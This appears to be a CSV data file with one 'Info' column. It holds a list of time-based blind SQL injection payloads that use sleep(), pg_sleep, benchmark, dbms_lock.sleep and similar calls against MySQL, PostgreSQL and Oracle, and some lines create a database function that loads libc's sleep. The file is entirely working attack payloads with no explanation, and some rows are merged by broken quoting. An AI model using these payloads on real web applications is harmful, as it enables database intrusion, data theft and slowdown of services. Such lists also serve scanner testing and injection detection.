Info,,
""" or 4240=(select 4240 from pg_sleep(5))--",,
' or sleep(5)-- nrzf,,
')) or sleep(5) and (('uzhd' like 'uzhd,,
""" where 5796=5796 and sleep(5)#",,
' and sleep(5)#,,
)) or sleep(5) and ((8285=8285,,
"' or elt(6272=6272,sleep(5)) and 'vrim'='vrim",,
""" where 7599=7599;begin user_lock.sleep(5); end--",,
' or 6793=(select 6793 from pg_sleep(5)),,
""")) or sleep(5) and ((""mcyv""=""mcyv",,
'+(select 'diet' where 7004=7004 rlike sleep(5))+',,
""" or sleep ( __TIME__ ) #",(select * from (select(sleep(5)))srmq) and ('pags'='pags,
' where 9649=9649 and 8594=(select 8594 from pg_sleep(5))--,,
"""  )  )   or sleep ( __TIME__ )  = """,begin user_lock.sleep(5), end--
'+(select xzse where 4530=4530,(select * from (select(sleep(5)))srmq))+',
") where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",,
""")));(select * from (select(sleep(5)))srmq) and (((""%""=""",,
"' in boolean mode) or elt(5873=5873,sleep(5)) #",,
"')));select benchmark(5000000,md5(0x714e4153)) #",,
"'+(select aahc where 5436=5436 and 3824=benchmark(5000000,md5(0x76555642)))+'",,
"') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c)) #",,
"%'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) –",,
' select pg_sleep(5) #, pjvi,
"' where 4334=4334 or elt(5873=5873,sleep(5))#",,
' in boolean mode) rlike sleep(5)#,,
) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,,
"') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",,
' rlike sleep(5),,
' where 1568=1568 or (select * from (select(sleep(5)))sddo)#,,
') rlike sleep(5) and ('boto'='boto,,
"') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",,
' pg_sleep ( __TIME__ ) –,begin user_lock.sleep(5), end
"%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""",,
' rlike sleep(5),,
") where 6784=6784 and elt(3114=3114,sleep(5)) #",,
) as wsyv where 8142=8142 rlike sleep(5) #,,
"' select benchmark(5000000,md5(0x714e4153)) #",,
')) rlike sleep(5) and ((8773=8773,,
 )  or sleep ( __TIME__ )  = ',begin user_lock.sleep(5), end and ('rlux' like 'rlux
""";select pg_sleep(5)--",,
""") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#",,
' and sleep(5)#,,
') where 1645=1645 rlike sleep(5)--,,
' (select * from (select(sleep(5)))lrov),,
' rlike (select * from (select(sleep(5)))sgvo) and 'vnkr' like 'vnkr,,
' or sleep ( __TIME__ ) #,select sleep(5) and ((('qjsc'='qjsc,
""";select sleep(5) and ""jvys"" like ""jvys",,
"));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",,
"')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--",,
) and sleep(5)#,,
'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||',,
""") as rcnk where 1800=1800;select sleep(5)--",,
')),begin dbms_lock.sleep(5), end--
""")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""fbol"" like ""fbol",,
"')) or elt(6272=6272,sleep(5)) and (('fele'='fele",,
'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||',,
"' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#",,
""" or elt(6272=6272,sleep(5)) and ""%""=""",,
' where 7176=7176,select pg_sleep(5)--,
') or sleep(5) and ('kgbm'='kgbm,,
"'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",,
"""))) rlike sleep(5) and (((""qcqx"" like ""qcqx",,
')) rlike sleep(5)#,,
'||(select 'aojt' from dual where 8499=8499,select pg_sleep(5)--,
"'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",,
""") where 1001=1001 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",,
'||(select 'zqwd' where 1647=1647 rlike sleep(5))||',,
""") where 9086=9086 or sleep(5)#",,
"' or 8466=benchmark(5000000,md5(0x694a4745)) and 'ntaw'='ntaw",,
